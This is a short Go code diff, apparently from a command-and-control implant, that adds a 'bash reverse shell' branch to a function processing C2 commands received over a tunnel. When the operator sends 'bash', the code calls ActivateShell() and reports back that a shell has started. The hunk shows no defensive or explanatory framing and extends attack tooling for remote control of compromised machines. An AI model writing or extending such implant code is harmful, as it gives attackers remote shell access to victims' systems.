@@ -61,6 +61,17 @@ func processCCData(data *TunData) {
 			}
 		}
 
+		// bash reverse shell
+		if cmdSlice[0] == "bash" {
+			if len(cmdSlice) != 1 {
+				return
+			}
+			ActivateShell()
+			out = "started bash shell"
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			goto send
+		}
+
 		// current working directory
 		if cmdSlice[0] == "pwd" {
 			if len(cmdSlice) != 1 {
